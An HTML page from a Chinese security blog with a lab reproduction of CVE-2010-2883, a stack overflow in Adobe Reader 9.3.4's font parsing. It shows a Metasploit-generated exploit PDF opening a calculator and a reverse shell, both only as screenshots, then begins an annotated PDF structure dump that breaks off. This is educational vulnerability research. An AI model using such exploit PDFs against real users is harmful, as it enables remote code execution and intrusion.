<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    
    <meta name="author" content="Shad0hun">
    
    <!-- Completely eliminate flash of wrong theme -->
    <script>
        (function() {
            const THEME_KEY = "REDEFINE-THEME-STATUS";
            const DARK = "dark", LIGHT = "light";
            
            // Get preferred theme
            function getTheme() {
                try {
                    const saved = localStorage.getItem(THEME_KEY);
                    if (saved) {
                        const { isDark } = JSON.parse(saved);
                        return isDark ? DARK : LIGHT;
                    }
                } catch (e) {}
                
                return matchMedia("(prefers-color-scheme: dark)").matches ? DARK : LIGHT;
            }
            
            // Apply theme to document
            function applyTheme(theme) {
                const isDark = theme === DARK;
                const root = document.documentElement;
                
                // Set data attribute for CSS variables
                root.setAttribute("data-theme", theme);
                
                // Set classes for compatibility
                root.classList.add(theme);
                root.classList.remove(isDark ? LIGHT : DARK);
                root.style.colorScheme = theme;
            }
            
            // Initial application
            const theme = getTheme();
            applyTheme(theme);
            
            // Listen for system preference changes
            matchMedia("(prefers-color-scheme: dark)").addEventListener("change", ({ matches }) => {
                // Only update if using system preference (no localStorage entry)
                if (!localStorage.getItem(THEME_KEY)) {
                    applyTheme(matches ? DARK : LIGHT);
                }
            });
            
            // Set body classes once DOM is ready
            if (document.readyState !== "loading") {
                document.body.classList.add(theme + "-mode");
            } else {
                document.addEventListener("DOMContentLoaded", () => {
                    document.body.classList.add(theme + "-mode");
                    document.body.classList.remove((theme === DARK ? LIGHT : DARK) + "-mode");
                });
            }
        })();
    </script>
    
    <!-- Critical CSS to prevent flash -->
    <style>
        :root[data-theme="dark"] {
            --background-color: #202124;
            --background-color-transparent: rgba(32, 33, 36, 0.6);
            --second-background-color: #2d2e32;
            --third-background-color: #34353a;
            --third-background-color-transparent: rgba(32, 33, 36, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #ffffff;
            --second-text-color: #eeeeee;
            --third-text-color: #bebec6;
            --fourth-text-color: #999999;
            --default-text-color: #bebec6;
            --invert-text-color: #373D3F;
            --border-color: rgba(255, 255, 255, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(255, 255, 255, 0.08);
            --shadow-color-2: rgba(255, 255, 255, 0.05);
        }
        
        :root[data-theme="light"] {
            --background-color: #fff;
            --background-color-transparent: rgba(255, 255, 255, 0.6);
            --second-background-color: #f8f8f8;
            --third-background-color: #f2f2f2;
            --third-background-color-transparent: rgba(241, 241, 241, 0.6);
            --primary-color: #0066CC;
            --first-text-color: #16171a;
            --second-text-color: #2f3037;
            --third-text-color: #5e5e5e;
            --fourth-text-color: #eeeeee;
            --default-text-color: #373D3F;
            --invert-text-color: #bebec6;
            --border-color: rgba(0, 0, 0, 0.08);
            --selection-color: #0066CC;
            --shadow-color-1: rgba(0, 0, 0, 0.08);
            --shadow-color-2: rgba(0, 0, 0, 0.05);
        }
        
        body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
        
        /* Apply body classes as soon as DOM is ready */
        :root[data-theme="dark"] body {
            background-color: var(--background-color);
            color: var(--default-text-color);
        }
    </style>
    
    <!-- preconnect -->
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>

    
    <!--- Seo Part-->
    
    <link rel="canonical" href="https://shad0hun.github.io/2025/07/11/漏洞复现/【漏洞复现】cve-2010-2883漏洞复现/"/>
    <meta name="robots" content="index,follow">
    <meta name="googlebot" content="index,follow">
    <meta name="revisit-after" content="1 days">
    
    
    
        
        <meta name="description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
<meta property="og:type" content="article">
<meta property="og:title" content="【漏洞复现】CVE-2010-2883漏洞复现">
<meta property="og:url" content="https://shad0hun.github.io/2025/07/11/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/%E3%80%90%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E3%80%91CVE-2010-2883%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/index.html">
<meta property="og:site_name" content="Shad0hun&#39;s blog">
<meta property="og:description" content="Hexo Theme Redefine, Redefine Your Hexo Journey.">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://shad0hun.github.io/images/redefine-og.webp">
<meta property="article:published_time" content="2025-07-11T10:16:28.000Z">
<meta property="article:modified_time" content="2025-07-16T04:17:38.912Z">
<meta property="article:author" content="John Doe">
<meta property="article:tag" content="漏洞复现">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://shad0hun.github.io/images/redefine-og.webp">
    
    
        <!-- Google tag (gtag.js) -->
        <script src="https://www.googletagmanager.com/gtag/js?id=G-2P50D0W8WD"></script>
        <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());

        gtag('config', 'G-2P50D0W8WD');
        </script>
    
    <!--- Icon Part-->
    <link rel="icon" type="image/png" href="/images/redefine-favicon.svg" sizes="192x192">
    <link rel="apple-touch-icon" sizes="180x180" href="/images/redefine-favicon.svg">
    <meta name="theme-color" content="#A31F34">
    <link rel="shortcut icon" href="/images/redefine-favicon.svg">
    <!--- Page Info-->
    
    <title>
        
            【漏洞复现】CVE-2010-2883漏洞复现 | Shadohun&#39;s Blog
        
    </title>

    
<link rel="stylesheet" href="/fonts/Chillax/chillax.css">


    <!--- Inject Part-->
    

    
<link rel="stylesheet" href="/css/style.css">


    
        
<link rel="stylesheet" href="/css/build/tailwind.css">

    

    
<link rel="stylesheet" href="/fonts/GeistMono/geist-mono.css">

    
<link rel="stylesheet" href="/fonts/Geist/geist.css">

    <!--- Font Part-->
    
    
    
        <link href="" rel="stylesheet">
    
    
        <link href="" rel="stylesheet">
    
    
    
        
<script src="/js/build/libs/anime.min.js"></script>

    

    <script id="hexo-configurations">
    window.config = {"hostname":"shad0hun.github.io","root":"/","language":"en"};
    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"delete_mask":false,"title_alignment":"left","headings_top_spacing":{"h1":"3.2rem","h2":"2.4rem","h3":"1.9rem","h4":"1.6rem","h5":"1.4rem","h6":"1.3rem"}},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","highlight_theme":{"light":"github","dark":"vs2015"},"font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"pangu_js":false,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null,"default_mode":"light"},"global":{"fonts":{"chinese":{"enable":true,"family":null,"url":null},"english":{"enable":true,"family":null,"url":null},"title":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":true,"percentage":false},"website_counter":{"url":"https://cn.vercount.one/js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"preloader":{"enable":true,"custom_message":"有空多读书，没事早点睡"},"open_graph":{"enable":true,"image":"/images/redefine-og.webp","description":"Hexo Theme Redefine, Redefine Your Hexo Journey."},"google_analytics":{"enable":true,"id":"G-2P50D0W8WD"}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-wqery6-light.webp","dark":"/images/wallhaven-wqery6-dark.webp"},"title":"Shad0hun's Blog","subtitle":{"text":["愿许秋风知我意，散我心中意难平"],"hitokoto":{"enable":false,"show_author":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":false,"style":"default","links":{"github":null,"instagram":null,"zhihu":null,"twitter":null,"email":null},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":false,"type":"fixed","audios":[{"name":null,"artist":null,"url":null,"cover":null,"lrc":null}]},"mermaid":{"enable":false,"version":"11.4.1"}},"version":"2.8.4","navbar":{"auto_hide":true,"color":{"left":"#f78736","right":"#367df7","transparency":35},"width":{"home":"1200px","pages":"1000px"},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"CSDN":{"path":"https://blog.csdn.net/qq_73985089","icon":null}},"search":{"enable":true,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"info","announcement":"致力于APT高级威胁分析，二进制漏洞挖掘\n在努力中...","show_on_mobile":true,"links":{"档案":{"path":"/archives","icon":"fa-regular fa-archive"},"标签":{"path":"/tags","icon":"fa-regular fa-tags"},"分类":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","excerpt_length":100,"categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2025/1/22 22:45:14"};
    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
    window.data = {"masonry":false};
  </script>
    
    <!--- Fontawesome Part-->
    
<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">

    
<link rel="stylesheet" href="/fontawesome/brands.min.css">

    
<link rel="stylesheet" href="/fontawesome/solid.min.css">

    
<link rel="stylesheet" href="/fontawesome/regular.min.css">

    
    
    
    
<meta name="generator" content="Hexo 7.3.0"></head>



<body>
	<div class="progress-bar-container">
	
	<span class="scroll-progress-bar"></span>
	

	
	<span class="pjax-progress-bar"></span>
	<!--        <span class="swup-progress-icon">-->
	<!--            <i class="fa-solid fa-circle-notch fa-spin"></i>-->
	<!--        </span>-->
	
</div>

<style>
    :root {
        --preloader-background-color: #fff;
        --preloader-text-color: #000;
    }

    @media (prefers-color-scheme: dark) {
        :root {
            --preloader-background-color: #202124;
            --preloader-text-color: #fff;
        }
    }

    @media (prefers-color-scheme: light) {
        :root {
            --preloader-background-color: #fff;
            --preloader-text-color: #000;
        }
    }

    @media (max-width: 600px) {
        .ml13 {
            font-size: 2.6rem !important; /* Adjust this value as needed */
        }
    }

    .preloader {
        display: flex;
        flex-direction: column;
        gap: 1rem; /* Tailwind 'gap-4' is 1rem */
        align-items: center;
        justify-content: center;
        position: fixed;
        padding: 12px;
        top: 0;
        right: 0;
        bottom: 0;
        left: 0;
        width: 100vw;
        height: 100vh; /* 'h-screen' is 100% of the viewport height */
        background-color: var(--preloader-background-color);
        z-index: 1100; /* 'z-[1100]' sets the z-index */
        transition: opacity 0.2s ease-in-out;
    }

    .ml13 {
        font-size: 3.2rem;
        /* text-transform: uppercase; */
        color: var(--preloader-text-color);
        letter-spacing: -1px;
        font-weight: 500;
        font-family: 'Chillax-Variable', sans-serif;
        text-align: center;
    }

    .ml13 .word {
        display: inline-flex;
        flex-wrap: wrap;
        white-space: nowrap;
    }

    .ml13 .letter {
        display: inline-block;
        line-height: 1em;
    }
</style>

<div class="preloader">
    <h2 class="ml13">
        有空多读书，没事早点睡
    </h2>
    <script>
        var textWrapper = document.querySelector('.ml13');
        // Split text into words
        var words = textWrapper.textContent.trim().split(' ');

        // Clear the existing content
        textWrapper.innerHTML = '';

        // Wrap each word and its letters in spans
        words.forEach(function(word) {
            var wordSpan = document.createElement('span');
            wordSpan.classList.add('word');
            wordSpan.innerHTML = word.replace(/\S/g, "<span class='letter'>$&</span>");
            textWrapper.appendChild(wordSpan);
            textWrapper.appendChild(document.createTextNode(' ')); // Add space between words
        });

        var animation = anime.timeline({ loop: true })
            .add({
                targets: '.ml13 .letter',
                translateY: [20, 0],
                translateZ: 0,
                opacity: [0, 1],
                filter: ['blur(5px)', 'blur(0px)'],
                easing: "easeOutExpo",
                duration: 1200,
                delay: (el, i) => 300 + 20 * i,
            })
            .add({
                targets: '.ml13 .letter',
                translateY: [0, -20],
                opacity: [1, 0],
                filter: ['blur(0px)', 'blur(5px)'],
                easing: "easeInExpo",
                duration: 1000,
                delay: (el, i) => 15 * i,
                complete: function() {
                    hidePreloader();
                }
            }, '-=700');


        let themeStatus = JSON.parse(localStorage.getItem('REDEFINE-THEME-STATUS'))?.isDark;

        // If the theme status is not found in local storage, check the preferred color scheme
        if (themeStatus === undefined || themeStatus === null) {
            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
                themeStatus = 'dark';
            } else {
                themeStatus = 'light';
            }
        }

        // Now you can use the themeStatus variable in your code
        if (themeStatus) {
            document.documentElement.style.setProperty('--preloader-background-color', '#202124');
            document.documentElement.style.setProperty('--preloader-text-color', '#fff');
        } else {
            document.documentElement.style.setProperty('--preloader-background-color', '#fff');
            document.documentElement.style.setProperty('--preloader-text-color', '#000');
        }

        window.addEventListener('load', function () {
            setTimeout(hidePreloader, 5000); // Call hidePreloader after 5000 milliseconds if not already called by animation
        });

        function hidePreloader() {
            var preloader = document.querySelector('.preloader');
            preloader.style.opacity = '0';
            setTimeout(function () {
                preloader.style.display = 'none';
            }, 200);
        }
    </script>
</div>

<main class="page-container" id="swup">

	

	<div class="main-content-container flex flex-col justify-between min-h-dvh">
		<div class="main-content-header">
			<header class="navbar-container px-6 md:px-12">
    <div class="navbar-content transition-navbar ">
        <div class="left">
            
            <a class="logo-title" href="/">
                
                Shadohun&#39;s Blog
                
            </a>
        </div>

        <div class="right">
            <!-- PC -->
            <div class="desktop">
                <ul class="navbar-list">
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   href="/"
                                        >
                                    <i class="fa-regular fa-house fa-fw"></i>
                                    HOME
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                        
                            

                            <li class="navbar-item">
                                <!-- Menu -->
                                <a class=""
                                   target="_blank" rel="noopener" href="https://blog.csdn.net/qq_73985089"
                                        >
                                    
                                    CSDN
                                    
                                </a>

                                <!-- Submenu -->
                                
                            </li>
                    
                    
                        <li class="navbar-item search search-popup-trigger">
                            <i class="fa-solid fa-magnifying-glass"></i>
                        </li>
                    
                </ul>
            </div>
            <!-- Mobile -->
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fa-solid fa-magnifying-glass"></i>
                    </div>
                
                <div class="icon-item navbar-bar">
                    <div class="navbar-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <!-- Mobile sheet -->
    <div class="navbar-drawer h-dvh w-full absolute top-0 left-0 bg-background-color flex flex-col justify-between">
        <ul class="drawer-navbar-list flex flex-col px-4 justify-center items-start">
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           href="/"
                        >
                            <span>
                                HOME
                            </span>
                            
                                <i class="fa-regular fa-house fa-sm fa-fw"></i>
                            
                        </a>
                        

                        
                    </li>
            
                
                    

                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full "
                           target="_blank" rel="noopener" href="https://blog.csdn.net/qq_73985089"
                        >
                            <span>
                                CSDN
                            </span>
                            
                        </a>
                        

                        
                    </li>
            

            
            
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/archives"
                        >
                            <span>档案</span>
                            <i class="fa-regular fa-archive fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/tags"
                        >
                            <span>标签</span>
                            <i class="fa-regular fa-tags fa-sm fa-fw"></i>
                        </a>
                    </li>
                
                    
                    <li class="drawer-navbar-item text-base my-1.5 flex flex-col w-full">
                        <a class="py-1.5 px-2 flex flex-row items-center justify-between gap-1 hover:!text-primary active:!text-primary text-2xl font-semibold group border-b border-border-color hover:border-primary w-full active"
                           href="/categories"
                        >
                            <span>分类</span>
                            <i class="fa-regular fa-folder fa-sm fa-fw"></i>
                        </a>
                    </li>
                
            
        </ul>

        <div class="statistics flex justify-around my-2.5">
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/tags">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">12</div>
        <div class="label text-third-text-color text-sm">Tags</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/categories">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">8</div>
        <div class="label text-third-text-color text-sm">Categories</div>
    </a>
    <a class="item tag-count-item flex flex-col justify-center items-center w-20" href="/archives">
        <div class="number text-2xl sm:text-xl text-second-text-color font-semibold">21</div>
        <div class="label text-third-text-color text-sm">Posts</div>
    </a>
</div>
    </div>

    <div class="window-mask"></div>

</header>


		</div>

		<div class="main-content-body transition-fade-up">
			

			<div class="main-content">
				<div class="post-page-container flex relative justify-between box-border w-full h-full">
	<div class="article-content-container">

		<div class="article-title relative w-full">
			
			<div class="w-full flex items-center pt-6 justify-start">
				<h1 class="article-title-regular text-second-text-color tracking-tight text-4xl md:text-6xl font-semibold px-2 sm:px-6 md:px-8 py-3">【漏洞复现】CVE-2010-2883漏洞复现</h1>
			</div>
			
		</div>

		
		<div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
			<div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
				<img src="/images/Shad0hun.svg">
			</div>
			<div class="info flex flex-col justify-between">
				<div class="author flex items-center">
					<span class="name text-default-text-color text-lg font-semibold">Shad0hun</span>
					
					<span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv3</span>
					
				</div>
				<div class="meta-info">
					<div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
        <span class="desktop">2025-07-11 18:16:28</span>
        <span class="mobile">2025-07-11 18:16:28</span>
        <span class="hover-info">Created</span>
    </span>
    
        <span class="article-date article-meta-item">
            <i class="fa-regular fa-wrench"></i>&nbsp;
            <span class="desktop">2025-07-16 12:17:38</span>
            <span class="mobile">2025-07-16 12:17:38</span>
            <span class="hover-info">Updated</span>
        </span>
    

    
        <span class="article-categories article-meta-item">
            <i class="fa-regular fa-folders"></i>&nbsp;
            <ul>
                
                
                    
                        
                        <li>
                            <a href="/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>&nbsp;
                        </li>
                    
                    
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-regular fa-tags"></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">漏洞复现</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
    
    
        <span class="article-pv article-meta-item">
            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

				</div>
			</div>
		</div>
		

		


		<div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
			<h1 id="漏洞概述"><a href="#漏洞概述" class="headerlink" title="漏洞概述"></a>漏洞概述</h1><p>**<code>Adobe Reader</code><strong>和</strong><code>Acrobat</code><strong>都是美国奥多比（Adobe）公司的产品。Adobe Reader是一款免费的<code>PDF文件阅读器</code>，Acrobat是一款<code>PDF文件编辑和转换工具</code>。基于</strong><code>Window</code><strong>和</strong><code>Mac OS X</code>**的Adobe Reader和Acrobat <code>9.4之前</code>的9.x版本，<code>8.2.5之前</code>的8.x版本的<code>CoolType.dll</code>中存在<code>基于栈的缓冲区溢出漏洞</code>。远程攻击者可借助带有<code>TTF字体</code>Smart INdependent Glyphlets (<code>SING</code>)表格中超长字段<code>uniqueName</code>的PDF文件<code>执行任意代码</code>或者导致<code>拒绝服务</code>（应用程序崩溃）。</p>
<h1 id="分析环境"><a href="#分析环境" class="headerlink" title="分析环境"></a>分析环境</h1><table>
<thead>
<tr>
<th></th>
<th>使用的环境</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>操作系统</td>
<td>Windows XP Professional SP3</td>
<td>简体中文版</td>
</tr>
<tr>
<td>虚拟机</td>
<td>VMware Workstation Pro</td>
<td>版本号:16.2.4</td>
</tr>
<tr>
<td>调试器</td>
<td>OllyDbg</td>
<td>吾爱破解OllyDbg</td>
</tr>
<tr>
<td>反汇编器</td>
<td>IDA Pro</td>
<td>版本号:7.0</td>
</tr>
<tr>
<td>漏洞软件</td>
<td>Adobe Reader</td>
<td>版本号:9.3.4</td>
</tr>
<tr>
<td><a class="link"   target="_blank" rel="noopener" href="http://www.oldversion.com/windows/download/acrobat-reader-9-3-4" >Adobe Reader 9.3.4下载地址<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a></td>
<td></td>
<td></td>
</tr>
</tbody></table>
<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>我们在MSF中直接生成exploit样本：</p>
<h2 id="弹出计算机"><a href="#弹出计算机" class="headerlink" title="弹出计算机"></a>弹出计算机</h2><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250707130730.png"
                      alt="20250707130730"
                ><br>我们拿到pdf后到目标系统上运行：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250707151337.png"
                      alt="20250707151337"
                ><br>很快就弹出了计算器，说明该漏洞复现成功。</p>
<h2 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h2><p>我kali的ip：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250707151929.png"
                      alt="20250707151929"
                ><br>搭建的靶机ip：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250707151957.png"
                      alt="20250707151957"
                ><br>我们首先生成exploit文件：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250707152422.png"
                      alt="20250707152422"
                ><br>然后在kali启动监听：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250707152756.png"
                      alt="20250707152756"
                ><br>当靶机打开我们生成的pdf文件之后，就会上线：<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/CVE/20250707152725.png"
                      alt="20250707152725"
                ><br>可以看到我们这里也是成功上线了。<br>好了，漏洞利用我们就到这里吧，我们现在去研究漏洞原理。</p>
<h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><h2 id="PDF文件格式"><a href="#PDF文件格式" class="headerlink" title="PDF文件格式"></a>PDF文件格式</h2><p>可移植文档形式（Portable Document Format，PDF）是一种独立于应用程序、硬件、操作系统的方式呈现文档的文件格式。PDF文件格式可以将文字、字型、格式、颜色以及独立于设备和分辨率的图形图像等封装在一个文件中。该格式文件还可以包含超文本链接、声音和动态影像等电子信息，支持特长文件，集成度和安全可靠性都比较高。而且这种文件格式是跨平台的，和操作系统无关。<br>PDF文档是一种文本和二进制混淆排列的格式，它由一下几部分组成：</p>
<ol>
<li><strong>header</strong>：头部，PDF文件的第一行，用以标识PDF文档的版本。通常格式为：<code>%PDF-x.y</code>，PDF版本经历了很多个版本更迭。</li>
<li><strong>body</strong>：PDF的主体部分，包含PDF文档的主题内容，各部分以对象的方式呈现。</li>
<li><strong>xref table</strong>：交叉引用表，通过交叉引用表可以快速地找到PDF文档中的各对象。每一个对象在交叉引用表中占据一项。</li>
<li><strong>trailer</strong>：PDF文档尾，包含交叉引用的摘要和交叉引用表的起始位置。<br>PDF文档中包含<strong>字体对象</strong>，本篇文章介绍漏洞就是发生在PDF阅读器对于字体解析过程中，未对字体对象中包含的<strong>SING表</strong>的<code>uniqueName</code>字段进行长度校验，导致了栈溢出漏洞。<br>这里我们可以使用<code>010Editor</code>工具读取一下PDF文件，看一下其结构：</li>
</ol>
<div class="code-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">%PDF-<span class="number">1.4</span>  <span class="comment">//此文档符合PDF1.4规范</span></span><br><span class="line">%D3 EB E9 E1</span><br><span class="line"><span class="number">1</span> <span class="number">0</span> obj   <span class="comment">//对象1</span></span><br><span class="line">&lt;&lt;/Creator (Mozilla/<span class="number">5.0</span> \(Windows NT <span class="number">10.0</span>; Win64; x64\) AppleWebKit/<span class="number">537.36</span> \(KHTML, like Gecko\) obsidian/<span class="number">1.6</span><span class="number">.3</span> Chrome/<span class="number">120.0</span><span class="number">.6099</span><span class="number">.291</span> Electron/<span class="number">28.3</span><span class="number">.3</span> Safari/<span class="number">537.36</span>)  <span class="comment">//这里记录了创建该文件的应用程序</span></span><br><span class="line">/Producer (Skia/PDF m120)  <span class="comment">//生成PDF的库</span></span><br><span class="line">/CreationDate (D:<span class="number">20241215104352</span>+<span class="number">00</span><span class="string">&#x27;00&#x27;</span>)  <span class="comment">//创建时间</span></span><br><span class="line">/ModDate (D:<span class="number">20241215104352</span>+<span class="number">00</span><span class="string">&#x27;00&#x27;</span>)&gt;&gt;  <span class="comment">//修改时间</span></span><br><span class="line">endobj</span><br><span class="line"><span class="number">3</span> <span class="number">0</span> obj  <span class="comment">//对象3</span></span><br><span class="line">&lt;&lt;/ca <span class="number">1</span>  <span class="comment">//不透明度</span></span><br><span class="line">/BM /Normal&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">6</span> <span class="number">0</span> obj  <span class="comment">//对象6</span></span><br><span class="line">&lt;&lt;/Type /XObject  <span class="comment">//标明是外部对象</span></span><br><span class="line">/Subtype /Image   <span class="comment">//子类型为图像</span></span><br><span class="line">/Width <span class="number">1436</span></span><br><span class="line">/Height <span class="number">690</span>       <span class="comment">//标识宽高</span></span><br><span class="line">/ColorSpace /DeviceRGB  <span class="comment">//色域</span></span><br><span class="line">/BitsPerComponent <span class="number">8</span></span><br><span class="line">/Filter /FlateDecode</span><br><span class="line">/Length <span class="number">40588</span>&gt;&gt; stream</span><br><span class="line">...</span><br><span class="line"><span class="number">36</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;/Type /FontDescriptor</span><br><span class="line">/FontName /BAAAAA+SegoeUI</span><br><span class="line">/Flags <span class="number">4</span></span><br><span class="line">/Ascent <span class="number">1079.10156</span></span><br><span class="line">/Descent <span class="number">250.97656</span></span><br><span class="line">/StemV <span class="number">53.222656</span></span><br><span class="line">/CapHeight <span class="number">700.19531</span></span><br><span class="line">/ItalicAngle <span class="number">0</span></span><br><span class="line">/FontBBox [-<span class="number">572.75391</span> -<span class="number">411.13281</span> <span class="number">1999.0234</span> <span class="number">1298.33984</span>]</span><br><span class="line">/FontFile2 <span class="number">35</span> <span class="number">0</span> R&gt;&gt;</span><br><span class="line">endobj</span><br><span class="line"><span class="number">37</span> <span class="number">0</span> obj</span><br><span class="line">&lt;&lt;/Type /Font</span><br><span class="line">/FontDescriptor <span class="number">36</span> <span class="number">0</span> R</span><br><span class="line">/BaseFont /BAAAAA+SegoeUI</span><br><span class="line">/Subtype /CIDFontType2</span><br><span class="line">/CIDToGIDMap /Identity</span><br><span class="line">/CIDSystemInfo &lt;&lt;/Registry (Adobe)</span><br><span class="line">/Ordering (Identity)</span><br><span class="line">/Supplement <span class="number">0</span>&gt;&gt;</span><br><span class="line">/W [<span class="number">0</span> [<span class="number">645.50781</span> <span class="number">0</span> <span class="number">0</span> <span class="number">273.92578</span>] <span class="number">14</span> [<span class="number">684.08203</span>] <span class="number">21</span> <span class="number">22</span> <span class="number">539.0625</span> <span class="number">36</span> [<span class="number">645.01953</span> <span class="number">0</span> <span class="number">619.14063</span> <span class="number">701.17188</span> <span class="number">505.85938</span> <span class="number">488.28125</span> <span class="number">686.03516</span> <span class="number">0</span> <span class="number">266.11328</span> <span class="number">0</span> <span 